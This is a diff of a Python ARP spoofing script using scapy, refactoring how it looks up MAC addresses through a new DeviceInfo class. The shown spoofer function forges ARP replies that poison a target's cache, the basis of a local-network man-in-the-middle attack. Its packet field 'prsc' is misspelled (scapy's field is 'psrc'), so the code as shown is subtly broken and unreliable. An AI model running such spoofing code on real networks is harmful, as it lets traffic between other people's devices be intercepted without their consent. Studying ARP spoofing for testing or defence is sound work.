@@ -3,7 +3,7 @@ import time
 import scapy.all as scapy
 from rich import print
 
-from services import get_mac
+from resources.services import DeviceInfo
 
 """
 ----  TO DO:  ----
@@ -37,9 +37,10 @@ def ScapyArpSpoofer(target, host, verbose):
 
 
     def spoofer(target, host):
-        packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), prsc=host)
+        packet = scapy.ARP(op=2, pdst=target, hwdst=di.get_mac(target), prsc=host)
         
         scapy.send(packet, verbose=False)
+
 
     try:
         packets_count = 0
@@ -58,5 +59,7 @@ def ScapyArpSpoofer(target, host, verbose):
         print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
         sys.exit(1)
 
+di = DeviceInfo()
+
 if __name__ == '__main__':
-    print(get_mac("192.168.5.132"))
+    print(di.get_mac("192.168.5.132"))
